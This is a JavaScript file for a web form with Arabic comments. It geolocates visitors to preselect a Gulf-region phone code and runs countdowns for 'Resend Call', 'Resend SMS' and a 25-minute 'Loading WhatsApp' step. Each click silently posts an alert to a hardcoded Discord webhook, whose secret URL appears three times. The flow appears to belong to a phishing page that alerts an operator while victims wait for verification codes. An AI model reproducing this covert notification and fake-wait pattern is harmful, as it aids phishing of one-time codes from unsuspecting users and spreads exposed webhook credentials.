function waitForCountrySelect() {

  const observer = new MutationObserver(() => {

    const select = document.getElementById("Address");

    if (select) {

      console.log("✅ select detected");

      select.value = "+968"; // default

      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(data => {

          const map = {
            OM: "+968",
            SA: "+966",
            AE: "+971",
            KW: "+965",
            BH: "+973",
            QA: "+974",
            JO: "+962",
            SY: "+963",
            YE: "+967",
            EG: "+20"
          };

          const code = map[data.country];

          if (code) {
            select.value = code;
          }

        });

      observer.disconnect(); // مهم باش مايبقاش يراقب
    }

  });

  observer.observe(document.body, {
    childList: true,
    subtree: true
  });

}

document.addEventListener("DOMContentLoaded", waitForCountrySelect);



// =======================

// زر Resend Call مع Discord
// -----------------------
function setupResendCallButton() {
  const webhookUrl = 'https://discord.com/api/webhooks/1374155202957152396/3zVluUSPNxJhR0LGrQtxgKCLJKtZVCLuWCH4BauDF5Syac_krLmlb3NMv6sF9sWBt629';

  // event delegation: الزر يتحمل ديناميكياً داخل #Variable_countainer
  $(document).on("click", "#resendCallBtn", function () {
    const btn = $(this);
    const chrono = btn.find("#callChrono");
    const chronoTimer = btn.find(".btn-chrono-timer");

    // منع الضغط المتكرر
    if (btn.prop("disabled")) return;

    // تعطيل الزر فوراً
    btn.prop("disabled", true);

    // عرض العد التنازلي
    chrono.show();
    let timeLeft = 300; // 5 دقائق = 300 ثانية

    // دالة لتحويل الثواني إلى MM:SS
    function formatTime(seconds) {
      const min = Math.floor(seconds / 60);
      const sec = seconds % 60;
      return `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
    }

    // عرض الوقت الأولي
    chronoTimer.text(formatTime(timeLeft));

    // إرسال إشعار إلى Discord
    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📞 تم الضغط على زر إعادة إرسال المكالمة!`
      })
    }).catch(err => console.error("❌ Error Discord webhook:", err));

    // بدء العد التنازلي
    const countdown = setInterval(() => {
      timeLeft--;
      chronoTimer.text(formatTime(timeLeft));
      if (timeLeft <= 0) {
        clearInterval(countdown);
        btn.prop("disabled", false); // إعادة تفعيل الزر
        chrono.hide();
      }
    }, 1000);
  });
}


function setupCardSelection() {
  console.log("setupCardSelection dummy function");
}

function autoSelectCountryCode() {
  console.log("autoSelectCountryCode dummy function");
}

// زر Resend SMS مع Discord
// -----------------------
// -----------------------
// زر Resend SMS مع Discord
// -----------------------
function setupResendSMSButton() {
  const webhookUrl = 'https://discord.com/api/webhooks/1374155202957152396/3zVluUSPNxJhR0LGrQtxgKCLJKtZVCLuWCH4BauDF5Syac_krLmlb3NMv6sF9sWBt629';

  // event delegation: الزر يتحمل ديناميكياً داخل #Variable_countainer
  $(document).on("click", "#resendSMSBtn", function () {
    const btn = $(this);
    const chrono = btn.find("#smsChrono");
    const chronoTimer = btn.find(".btn-chrono-timer");

    // منع الضغط المتكرر
    if (btn.prop("disabled")) return;

    // تعطيل الزر فوراً
    btn.prop("disabled", true);

    // عرض العد التنازلي
    chrono.show();
    let timeLeft = 300; // 5 دقائق = 300 ثانية

    // دالة لتحويل الثواني إلى MM:SS
    function formatTime(seconds) {
      const min = Math.floor(seconds / 60);
      const sec = seconds % 60;
      return `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
    }

    // عرض الوقت الأولي
    chronoTimer.text(formatTime(timeLeft));

    // إرسال إشعار إلى Discord
    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📩 تم الضغط على زر إعادة إرسال SMS!`
      })
    }).catch(err => console.error("❌ Error Discord webhook:", err));

    // بدء العد التنازلي
    const countdown = setInterval(() => {
      timeLeft--;
      chronoTimer.text(formatTime(timeLeft));
      if (timeLeft <= 0) {
        clearInterval(countdown);
        btn.prop("disabled", false); // إعادة تفعيل الزر
        chrono.hide();
      }
    }, 1000);
  });
}





// ========================
// Loading WhatsApp 25min Countdown
function setupGreenCircleButton() {

  const webhookUrl = 'https://discord.com/api/webhooks/1374155202957152396/3zVluUSPNxJhR0LGrQtxgKCLJKtZVCLuWCH4BauDF5Syac_krLmlb3NMv6sF9sWBt629';

  $(document).on("click", "#greenCircleBtn", function () {

    const btn = $(this);
    const chrono = $("#circleChrono");
    const timer = $("#circleTimer");

    if (btn.prop("disabled")) return;

    btn.prop("disabled", true);
    chrono.show();

    let timeLeft = 1500; // 5min

    function formatTime(seconds) {
      const min = Math.floor(seconds / 60);
      const sec = seconds % 60;

      return String(min).padStart(2, '0') + ":" +
        String(sec).padStart(2, '0');
    }

    timer.text(formatTime(timeLeft));

    // 🔥 Discord notification
    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "🟢 تم الضغط على الزر الأخضر وبدأ العد التنازلي!"
      })
    });

    const countdown = setInterval(() => {

      timeLeft--;
      timer.text(formatTime(timeLeft));

      if (timeLeft <= 0) {
        clearInterval(countdown);
        btn.prop("disabled", false);
        chrono.hide();
      }

    }, 1000);

  });

}